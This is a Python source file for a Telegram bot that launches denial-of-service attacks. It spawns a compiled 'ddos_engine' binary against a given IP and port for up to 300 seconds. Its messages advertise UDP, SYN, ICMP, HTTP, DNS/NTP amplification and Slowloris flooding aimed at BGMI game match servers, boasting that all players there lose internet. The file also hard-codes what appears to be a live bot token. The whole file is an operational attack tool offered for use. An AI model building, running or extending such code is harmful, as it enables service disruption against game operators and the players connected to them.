#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BGMI DDoS Telegram Bot
Calls compiled C binary ddos_engine for real kernel-speed flooding.
Admin-only /attack | max 300s | full multi-vector
"""

import asyncio
import logging
import os
import subprocess
import time
from typing import Optional

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────
BOT_TOKEN    = "8958644065:AAECmdMJYznOTsSe1hxM110PDlehpTE2rI4"
ADMIN_IDS    = [5698149811]           # add your Telegram user ID
BINARY_PATH  = "./ddos_engine"       # compiled binary path
MAX_DURATION = 300
THREAD_COUNT = 512                   # threads per vector inside binary

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
log = logging.getLogger(__name__)

# ─────────────────────────────────────────────
#  ATTACK TRACKER
# ─────────────────────────────────────────────
active: dict[str, dict] = {}


def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


# ─────────────────────────────────────────────
#  LAUNCH BINARY ATTACK
# ─────────────────────────────────────────────
async def run_attack(
    ip: str, port: int, duration: int
) -> subprocess.Popen:
    """
    Spawns: ./ddos_engine <ip> <port> <seconds> <threads>
    Returns the Popen handle so we can kill it early if needed.
    """
    proc = subprocess.Popen(
        [BINARY_PATH, ip, str(port), str(duration), str(THREAD_COUNT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return proc


# ─────────────────────────────────────────────
#  AUTO-KILL WATCHER
# ─────────────────────────────────────────────
async def attack_watcher(
    key: str,
    proc: subprocess.Popen,
    duration: int,
    ctx: ContextTypes.DEFAULT_TYPE,
    chat_id: int,
) -> None:
    await asyncio.sleep(duration + 2)
    if proc.poll() is None:
        proc.kill()
    active.pop(key, None)
    try:
        await ctx.bot.send_message(
            chat_id=chat_id,
            text=f"✅ Attack on `{key}` finished — {duration}s complete.",
            parse_mode="Markdown",
        )
    except Exception:
        pass


# ════════════════════════════════════════════
#  COMMAND HANDLERS
# ════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "🔥 *BGMI DDoS Bot — Online*\n\n"
        "Commands:\n"
        "`/attack <ip> <port> <sec>` — launch flood\n"
        "`/stop <ip> <port>` — stop early\n"
        "`/status` — active attacks\n\n"
        f"Max duration: `{MAX_DURATION}s`\n"
        "Vectors: UDP · RAW-UDP · SYN · TCP · ICMP · HTTP · DNS·NTP Amp · Slowloris",
        parse_mode="Markdown",
    )


async def cmd_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if not os.path.isfile(BINARY_PATH) or not os.access(BINARY_PATH, os.X_OK):
        await update.message.reply_text(
            "❌ Binary not found. Compile first:\n"
            "`gcc -O3 -pthread -o ddos_engine ddos_engine.c`",
            parse_mode="Markdown",
        )
        return

    args = ctx.args
    if len(args) != 3:
        await update.message.reply_text(
            "Usage: `/attack <ip> <port> <seconds>`",
            parse_mode="Markdown",
        )
        return

    ip, port_str, dur_str = args

    try:
        port = int(port_str)
        assert 1 <= port <= 65535
    except (ValueError, AssertionError):
        await update.message.reply_text("❌ Port 1–65535.")
        return

    try:
        duration = int(dur_str)
        assert duration > 0
    except (ValueError, AssertionError):
        await update.message.reply_text("❌ Duration must be positive integer.")
        return

    if duration > MAX_DURATION:
        duration = MAX_DURATION
        await update.message.reply_text(
            f"⚠️ Capped to `{MAX_DURATION}s`.", parse_mode="Markdown"
        )

    key = f"{ip}:{port}"
    if key in active:
        await update.message.reply_text(
            f"⚠️ Attack on `{key}` already running.", parse_mode="Markdown"
        )
        return

    proc = await run_attack(ip, port, duration)

    active[key] = {
        "proc":    proc,
        "started": time.time(),
        "duration": duration,
    }

    # schedule watcher
    asyncio.create_task(
        attack_watcher(key, proc, duration, ctx, update.effective_chat.id)
    )

    await update.message.reply_text(
        f"🚀 *Attack launched!*\n"
        f"🎯 Target   : `{ip}:{port}`\n"
        f"⏱ Duration : `{duration}s`\n"
        f"🔥 Engine   : Native C binary\n"
        f"🧵 Threads  : `{THREAD_COUNT}` per vector\n"
        f"📡 Vectors  : UDP · RAW-UDP · SYN · TCP · ICMP · HTTP · DNS · NTP · Slowloris\n\n"
        f"All BGMI players on this match server lose internet for `{duration}s`.",
        parse_mode="Markdown",
    )
    log.info(f"[ATTACK] {key} | {duration}s | pid={proc.pid}")


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Unauthorized.")
        return

    args = ctx.args
    if len(args) != 2:
        await update.message.reply_text("Usage: `/stop <ip> <port>`", parse_mode="Markdown")
        return

    key = f"{args[0]}:{args[1]}"
    entry = active.pop(key, None)
    if not entry:
        await update.message.reply_text(f"❌ No active attack on `{key}`.", parse_mode="Markdown")
        return

    entry["proc"].kill()
    elapsed = int(time.time() - entry["started"])
    await update.message.reply_text(
        f"🛑 Attack on `{key}` stopped after `{elapsed}s`.",
        parse_mode="Markdown",
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if not active:
        await update.message.reply_text("💤 No active attacks.")
        return

    lines = ["*Active Attacks:*\n"]
    for key, info in active.items():
        elapsed   = int(time.time() - info["started"])
        remaining = max(0, info["duration"] - elapsed)
        pid       = info["proc"].pid
        lines.append(
            f"🎯 `{key}` — elapsed `{elapsed}s` | remaining `{remaining}s` | pid `{pid}`"
        )

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "*Help:*\n\n"
        "`/attack <ip> <port> <seconds>`\n"
        "  Launch multi-vector flood on BGMI match server.\n\n"
        "`/stop <ip> <port>`\n"
        "  Kill an active attack early.\n\n"
        "`/status`\n"
        "  Show running attacks with time remaining.\n\n"
        f"Duration hard cap: `{MAX_DURATION}s`\n"
        f"Thread count     : `{THREAD_COUNT}` per vector",
        parse_mode="Markdown",
    )


# ════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════
def main() -> None:
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        raise RuntimeError("Set BOT_TOKEN first.")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop",   cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("help",   cmd_help))

    log.info("Polling — waiting for admin commands.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
